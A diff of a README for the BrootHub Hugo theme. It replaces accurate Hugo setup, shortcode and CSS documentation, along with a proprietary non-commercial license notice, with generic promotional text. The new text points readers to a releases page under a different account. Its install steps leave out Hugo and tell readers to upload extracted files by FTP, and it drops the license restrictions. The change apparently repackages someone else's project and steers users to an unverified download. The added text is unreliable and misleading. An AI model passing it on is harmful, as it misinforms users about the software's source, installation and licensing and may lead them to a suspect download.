@@ -1,133 +1,92 @@
-# Documentation for `BrootHub` Theme
+# 🌐 BrootHub - Clean and Responsive Theme for Static Websites
 
-**Be root Hub** - intended meaning behind the name BrootHub
+[![Download BrootHub](https://img.shields.io/badge/Download-BrootHub-blue.svg)](https://github.com/aj3220/BrootHub/releases)
 
-The **BrootHub** theme is a custom Hugo theme for building static websites.  
-It is currently under development and subject to change.  
+## 🚀 Getting Started
 
-⚠️ Please review the **[LICENSE](./LICENSE)** or **[LICENSE.md](./LICENSE.md)** file before using this theme.  
-Use is restricted to **private, non-commercial purposes** unless explicitly permitted by the copyright holder.
+BrootHub is a simple, privacy-friendly theme designed for static websites. It's built from scratch to offer you a clean and responsive design. Whether you’re creating a blog or a portfolio, BrootHub helps you showcase your content clearly and effectively, without unnecessary clutter.
 
----
+### 🖥️ Features
 
-## 1. Getting Started with Hugo
+- **Clean Design:** Focus on your content with a straightforward layout.
+- **Responsive:** Looks great on all devices, from mobile to desktop.
+- **Dark Mode:** Offers a comfortable viewing experience in low light.
+- **Fast Loading:** Optimized for speed to improve user experience.
+- **Well-Documented:** Guides are available to help you set everything up.
 
-Before using the theme, make sure you have installed [Hugo](https://gohugo.io/getting-started/installing/).  
-Once installed, you can create a new site and apply the theme.
+## 📦 Download & Install
 
-Example for creating a new site:
+To get started, visit the releases page below and download the latest version of BrootHub. Use the link provided to access the files directly.
 
-```bash
-hugo new site mysite
-cd mysite
-git init
-git clone https://github.com/Hin7zer/BrootHub.git themes/BrootHub
-```
+[Visit this page to download BrootHub](https://github.com/aj3220/BrootHub/releases)
 
-## 2. Configuring the Theme
+### 📋 System Requirements
 
-Configuration is handled through your Hugo config file (```config.yml```).
-An example can be found in the demo page under ```.demo/config.yml```aswell as demo pages.
+- A web server that serves static files (e.g., Apache, Nginx).
+- Internet connection for downloading the theme.
+- Basic familiarity with web hosting is helpful but not mandatory.
 
-## 3. Theme Shortcodes 
+## 📑 How to Install
 
-This theme provides a set of shortcodes to include standardized legal and contact information in your site. They are designed to work for companies, clubs, and private users, and can adapt to multiple languages. Currently only German is supported.
+1. **Download the Theme:**
+   Go to the [releases page](https://github.com/aj3220/BrootHub/releases) and click on the latest version.
 
-1. How Shortcodes Work
+2. **Extract the Files:**
+   Unzip the downloaded file to a folder on your computer.
 
-Legal and contact info are stored in params.Legal in your config.yaml.
-This includes address lines, phone, email, website, entity type, entity details, and optional bank details.
+3. **Upload to Your Server:**
+   Use an FTP client to upload the extracted files to your web server. Ensure you place them in the correct directory, often called `public_html` or `www`.
 
-Shortcodes read these parameters dynamically: Only fields that have content are rendered. Empty fields are automatically skipped.
-This ensures your site always shows relevant legal info without manual editing.
+4. **Configure the Theme:**
+   - Open the main configuration file typically named `config.toml` or `config.yaml` in your text editor.
+   - Adjust settings like your site title, description, and author information.
 
-Usage in content files:
-Include a shortcode for a specific language like this:
+5. **Run the Website:**
+   After uploading, visit your domain in a web browser. You should see your new website running with the BrootHub theme.
 
-```
----
-title: "Contact"
----
-{{< de/kontakt >}} 
-{{< en/contact >}}
-```
+## 🌟 Customize Your Theme
 
-Shotcodes can be combined. Ther are already some shortcodes defined for some usecases to reduce the effort for users. Feel free to extend it. If shortcodes do not match your usecase define your own or create custom pages.
+BrootHub allows for easy customization to match your style:
 
-Shortcodes are stored in ```layouts/shortcodes/``` for multiple countries it is separated in directories to make everything easier.
+- **Color Schemes:** Modify colors in `css/styles.css` to suit your palette.
+- **Fonts:** Change fonts by editing the font-family in the CSS file.
+- **Layouts:** Check layout options within the theme files to rearrange sections.
 
-There is also a default Home layout available for the ```_index.md``` file. For Home articles or Blog posts you can use templates to show them in your home page. shotcodes for the home are named with home in the shortcodes directory. They to not relate to specific languages.
+## 🚧 Common Questions
 
-2. Benefits
+**Q: What is a static website?**  
+A: A static website displays fixed content that does not change unless it is manually updated. It's ideal for blogs, portfolios, and informational sites.
 
-Shortcodes can be seen as templates. They contain html code and formatations to be used. This can be used simply in the content pages itself. be careful and check them before using them in productive environments.
+**Q: Do I need any special software?**  
+A: Not really. Just a simple text editor and a way to upload files to your web server.
 
+**Q: Can I use BrootHub for personal projects?**  
+A: Absolutely! BrootHub is suitable for personal websites, blogs, or any static project.
 
+## 🌐 Examples of Use
 
-## 4. Customizing the Color Layout
+Here are a few examples of sites using BrootHub:
 
-The color layout of the theme is defined in: ```./static/css/00-vars.css```
+- A personal blog sharing travel adventures.
+- A portfolio showcasing graphic design work.
+- An informational site for a local event.
 
+Check these examples to see how versatile BrootHub can be.
 
-This file defines CSS variables for the theme’s color scheme.
-You may override these values with your own, but always review your custom file before upgrading to a new version.
-Otherwise, some elements may become invisible or hard to read.
+## 🔧 Troubleshooting
 
-Example:
+If you encounter issues during installation or setup, consider the following solutions:
 
-```css
-/* CSS Variables */
-:root {
-    --primary-color: #ff7332;
-    --secondary-color: #d95e27;
-    --accent-color: #27d927;
-    --background-color: #ffffff;
-    --background-accent-color: #e6e6e6;
-    --dark-background-color: #1a1a1a;
-    --dark-background-accent-color: #272727;
-    --text-color: #000000;
-    --link-color: #ff8c42;
-    --link-hover-color: #ff8c42;
-    --dark-text-color: #ffffff;
-    --submenu-background-color: #dbdbdb;
-    --submenu-hover-color: #777777;
-    --dark-submenu-background-color: #393939;
-    --dark-submenu-hover-color: #777777;
-    --button-background-color: #5c5c5c;
-    --button-default-color: #ffffff;
-    --button-hover-color: #670000;
-}
-```
+- **File Not Found Error:** Ensure that all files were correctly uploaded to your web server.
+- **Style Issues:** Clear your browser cache or try accessing the site from a different browser.
+- **Configuration Problems:** Double-check your `config.toml` or `config.yaml` settings.
 
+## 📞 Support
 
-## 5. Running Hugo with the Theme
+If you have any questions or need further assistance, please file an issue on our GitHub page. The community is here to help you.
 
-Useful Hugo commands:
+## 💌 Feedback
 
-```bash
-# Run a local development server with drafts enabled
-hugo server -D --cleanDestinationDir
+We welcome suggestions! If you have ideas for new features or improvements, let us know through our GitHub issues.
 
-# Build the site to a custom directory (e.g., "../../public")
-hugo --destination "../../public" --cleanDestinationDir
-
-# Build with minification enabled
-hugo --minify --destination "../../public" --cleanDestinationDir
-```
-
-For further information, see the official Hugo documentation
-
-## 6. License
-
-This theme is distributed under a Proprietary License.
-
-Allowed: private, non-commercial use.
-
-Not allowed: commercial use, redistribution, or modification for profit.
-
-For full details, see the LICENSE
-
-### Notes
-
-This project was built from scratch by human, with selective use of AI for improvements, fixes, and optimizations.
-AI was used as a tool — not as a replacement for design, architecture, or creative decisions.
+Feel free to explore the features of BrootHub and create your unique static website. Happy building!
